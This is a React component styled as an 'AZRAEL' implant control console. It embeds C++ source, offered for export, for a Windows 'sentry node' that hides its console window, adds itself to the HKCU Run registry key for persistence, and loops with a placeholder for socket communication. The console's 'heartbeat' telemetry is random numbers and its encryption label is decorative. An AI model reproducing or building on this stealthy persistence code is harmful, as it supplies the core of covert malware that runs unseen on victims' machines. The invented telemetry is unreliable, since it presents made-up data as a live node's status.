import React, { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { Shield, Terminal, Zap, Cpu, Activity, Download, Code, Server, Lock, AlertTriangle, ChevronRight, Binary } from 'lucide-react';

interface Heartbeat {
    timestamp: string;
    pulse: number;
    status: 'ACTIVE' | 'HIBERNATING' | 'COMPROMISED';
}

export const SentryNodeOrchestrator: React.FC = () => {
    const [isDeployed, setIsDeployed] = useState(false);
    const [viewMode, setViewMode] = useState<'TELEMETRY' | 'SOURCE'>('TELEMETRY');
    const [heartbeats, setHeartbeats] = useState<Heartbeat[]>([]);
    const [logs, setLogs] = useState<string[]>([]);
    
    const addLog = (msg: string) => setLogs(prev => [`[${new Date().toLocaleTimeString()}] ${msg}`, ...prev].slice(0, 15));

    const cppSource = `#include <windows.h>
#include <iostream>
#include <string>

// AZRAEL S-1792 | SOVEREIGN SENTRY NODE
// TARGET: NT 6.0 (VISTA)

void EstablishPersistence() {
    char szPath[MAX_PATH];
    GetModuleFileNameA(NULL, szPath, MAX_PATH);

    HKEY hKey;
    // Injecting into the Run key for persistence
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "SentryNode1792", 0, REG_SZ, (const BYTE*)szPath, strlen(szPath) + 1);
        RegCloseKey(hKey);
    }
}

void InitializeSentryNode() {
    // Forensic Silence: Hide the console window
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);

    // Persistence Protocol
    EstablishPersistence();

    // The Pulse: Placeholder for raw socket communication logic
    while (true) {
        // AZRAEL IS WATCHING
        Sleep(60000); // 60s Pulse
    }
}

int main() {
    InitializeSentryNode();
    return 0;
}`;

    const deploySentry = () => {
        setIsDeployed(true);
        addLog("SENTRY_NODE_INITIATED: TARGETING_NT_6.0");
        addLog("ESTABLISHING_PERSISTENCE: REG_RUN_KEY_INJECTION");
        addLog("FORENSIC_SILENCE_ACTIVE: HWND_HIDE");
    };

    useEffect(() => {
        if (!isDeployed) return;
        
        const interval = setInterval(() => {
            const newHeartbeat: Heartbeat = {
                timestamp: new Date().toLocaleTimeString(),
                pulse: Math.floor(Math.random() * 100),
                status: 'ACTIVE'
            };
            setHeartbeats(prev => [newHeartbeat, ...prev].slice(0, 10));
            addLog(`HEARTBEAT_ACK: PULSE_${newHeartbeat.pulse}`);
        }, 5000);
        
        return () => clearInterval(interval);
    }, [isDeployed]);

    return (
        <div className="bg-[#050505] border border-[#2D2D2D] p-10 font-mono space-y-10 min-h-[700px] relative overflow-hidden">
            {/* Visual Header */}
            <div className="relative z-10 flex flex-col md:flex-row md:items-end justify-between border-b border-[#2D2D2D] pb-8 gap-6">
                <div className="space-y-2">
                    <div className="flex items-center gap-4">
                        <div className="bg-[#8B0000] p-1.5 shadow-[0_0_15px_rgba(139,0,0,0.3)]">
                            <Shield className={`w-6 h-6 text-black ${isDeployed ? 'animate-pulse' : ''}`} />
                        </div>
                        <h1 className="text-3xl font-black italic tracking-tighter uppercase text-white">Sentry Node Orchr</h1>
                    </div>
                    <div className="text-[10px] text-gray-500 uppercase tracking-[0.5em] font-bold">
                        AZRAEL_S1792 // WINDOWS_PERSISTENCE_CORE
                    </div>
                </div>

                <div className="flex gap-4">
                    <button 
                        onClick={() => setViewMode('TELEMETRY')}
                        className={`text-[9px] uppercase font-bold px-4 py-2 border transition-all ${viewMode === 'TELEMETRY' ? 'bg-[#8B0000] border-[#8B0000] text-white' : 'bg-black border-[#2D2D2D] text-gray-600'}`}
                    >
                        Telemetry_Feed
                    </button>
                    <button 
                        onClick={() => setViewMode('SOURCE')}
                        className={`text-[9px] uppercase font-bold px-4 py-2 border transition-all ${viewMode === 'SOURCE' ? 'bg-[#8B0000] border-[#8B0000] text-white' : 'bg-black border-[#2D2D2D] text-gray-600'}`}
                    >
                        Source_Forge
                    </button>
                </div>
            </div>

            <div className="grid grid-cols-1 lg:grid-cols-12 gap-10 relative z-10">
                {/* Left: Deployment & Status */}
                <div className="lg:col-span-4 space-y-8">
                    <div className="bg-[#0A0A0A] border border-[#2D2D2D] p-6 space-y-6">
                        <div className="text-[11px] text-[#8B0000] font-black uppercase tracking-widest flex items-center gap-2 border-b border-[#2D2D2D] pb-3">
                            <Binary className="w-4 h-4" /> Node_Parameters
                        </div>
                        <div className="space-y-4">
                            <div className="flex justify-between items-center text-[10px]">
                                <span className="text-gray-500">Target_OS</span>
                                <span className="text-white font-bold">NT 6.0 (Vista)</span>
                            </div>
                            <div className="flex justify-between items-center text-[10px]">
                                <span className="text-gray-500">Persistence</span>
                                <span className="text-white font-bold">REG_RUN_INJECT</span>
                            </div>
                            <div className="flex justify-between items-center text-[10px]">
                                <span className="text-gray-500">Silence_Level</span>
                                <span className="text-white font-bold">FORENSIC_HIDE</span>
                            </div>
                            <div className="flex justify-between items-center text-[10px]">
                                <span className="text-gray-500">Node_Status</span>
                                <span className={isDeployed ? "text-green-500 font-bold" : "text-gray-700 font-bold"}>
                                    {isDeployed ? "ACTIVE" : "STANDBY"}
                                </span>
                            </div>
                        </div>
                    </div>

                    {!isDeployed ? (
                        <button 
                            onClick={deploySentry}
                            className="w-full group relative overflow-hidden bg-white text-black font-black uppercase tracking-[0.4em] py-5 text-xs transition-all flex items-center justify-center gap-3 active:scale-95"
                        >
                            <div className="absolute inset-0 bg-[#8B0000] -translate-x-full group-hover:translate-x-0 transition-transform duration-300" />
                            <span className="relative z-10 group-hover:text-white transition-colors">Deploy_Sentry_Node</span>
                            <Zap className="w-4 h-4 relative z-10" />
                        </button>
                    ) : (
                        <div className="bg-[#8B0000]/10 border border-[#8B0000] p-4 flex items-start gap-4">
                            <AlertTriangle className="w-5 h-5 text-[#8B0000] shrink-0" />
                            <div className="text-[9px] text-[#8B0000] uppercase font-black leading-tight">
                                NODE_LIVE. PERSISTENCE_LOCKED. THE_ARCHITECT_IS_WATCHED.
                            </div>
                        </div>
                    )}

                    {/* Mini Visualizer */}
                    <div className="h-24 bg-black border border-[#2D2D2D] relative overflow-hidden">
                        <div className="absolute inset-0 bg-[radial-gradient(circle_at_center,rgba(139,0,0,0.1)_0%,transparent_70%)]" />
                        <div className="flex items-end justify-between h-full px-4 pb-2 gap-1">
                            {heartbeats.map((h, i) => (
                                <motion.div 
                                    key={i}
                                    initial={{ height: 0 }}
                                    animate={{ height: `${h.pulse}%` }}
                                    className="w-full bg-[#8B0000] opacity-50"
                                />
                            ))}
                        </div>
                    </div>
                </div>

                {/* Right: Telemetry or Source */}
                <div className="lg:col-span-8">
                    <AnimatePresence mode="wait">
                        {viewMode === 'TELEMETRY' ? (
                            <motion.div 
                                key="telemetry"
                                initial={{ opacity: 0, x: 20 }}
                                animate={{ opacity: 1, x: 0 }}
                                exit={{ opacity: 0, x: -20 }}
                                className="space-y-6"
                            >
                                <div className="bg-[#0A0A0A] border border-[#2D2D2D] p-6 h-[400px] flex flex-col">
                                    <div className="flex justify-between items-center border-b border-[#2D2D2D] pb-3 mb-4">
                                        <div className="text-[10px] text-white font-black uppercase tracking-widest flex items-center gap-2">
                                            <Activity className="w-3 h-3 text-[#8B0000]" /> Live_Heartbeat_Log
                                        </div>
                                        <div className="text-[8px] text-gray-700">ENCRYPTION: 4096-BIT_RSA</div>
                                    </div>
                                    <div className="flex-1 overflow-y-auto custom-scrollbar space-y-2 pr-2">
                                        {logs.length === 0 && <div className="text-[#1A1A1A] italic text-[10px]">AWAITING_DEPLOYMENT_HANDSHAKE...</div>}
                                        {logs.map((log, i) => (
                                            <div key={i} className="text-[9px] flex gap-3 text-gray-500 hover:text-white transition-colors cursor-default">
                                                <span className="opacity-20">[{i}]</span>
                                                <span className={log.includes('INITIATED') ? 'text-white' : ''}>{log}</span>
                                            </div>
                                        ))}
                                    </div>
                                </div>
                            </motion.div>
                        ) : (
                            <motion.div 
                                key="source"
                                initial={{ opacity: 0, x: 20 }}
                                animate={{ opacity: 1, x: 0 }}
                                exit={{ opacity: 0, x: -20 }}
                                className="space-y-6"
                            >
                                <div className="bg-black border border-[#2D2D2D] p-6 h-[500px] overflow-hidden flex flex-col">
                                    <div className="flex justify-between items-center border-b border-[#2D2D2D] pb-3 mb-4">
                                        <div className="text-[10px] text-white font-black uppercase tracking-widest flex items-center gap-2">
                                            <Code className="w-3 h-3 text-[#8B0000]" /> Node_Source_Forge
                                        </div>
                                        <button className="text-[9px] text-[#8B0000] hover:text-white transition-colors flex items-center gap-1">
                                            <Download className="w-3 h-3" /> EXPORT_CPP
                                        </button>
                                    </div>
                                    <pre className="flex-1 overflow-y-auto custom-scrollbar text-[9px] text-gray-400 bg-[#020202] p-4 border border-[#1A1A1A]">
                                        <code>{cppSource}</code>
                                    </pre>
                                </div>
                            </motion.div>
                        )}
                    </AnimatePresence>
                </div>
            </div>

            {/* Visual Grid Lines */}
            <div className="absolute top-0 right-0 w-32 h-full opacity-[0.03] pointer-events-none">
                <div className="h-full border-l border-[#2D2D2D] grid grid-rows-10">
                    {Array(10).fill(0).map((_, i) => (
                        <div key={i} className="border-b border-[#2D2D2D]" />
                    ))}
                </div>
            </div>
        </div>
    );
};
